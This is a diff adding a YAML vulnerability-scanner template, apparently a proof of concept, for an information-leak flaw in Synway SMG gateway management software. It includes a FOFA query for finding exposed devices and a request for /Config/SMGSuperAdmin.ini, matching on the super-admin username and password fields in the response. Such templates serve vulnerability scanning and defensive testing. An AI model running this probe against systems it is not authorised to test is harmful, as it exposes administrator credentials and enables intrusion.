@@ -1,0 +1,26 @@
+id: poc-yaml-san-hui-smg-gms-smgsuperadmin-info-leak
+info:
+  name: 三汇SMG 网关管理软件 SMGSuperAdmin 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 三汇SMG 网关管理软件
+  fofa: app="Synway-网关管理软件"
+requests:
+- method: GET
+  path: /Config/SMGSuperAdmin.ini
+  expression: 'status_code == 200 &&
+
+    contains(body,"[SuperUserInfo]") &&
+
+    contains(body,"SuperUserName=") &&
+
+    contains(body,"SuperPwd=") &&
+
+    !contains(body,"<") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
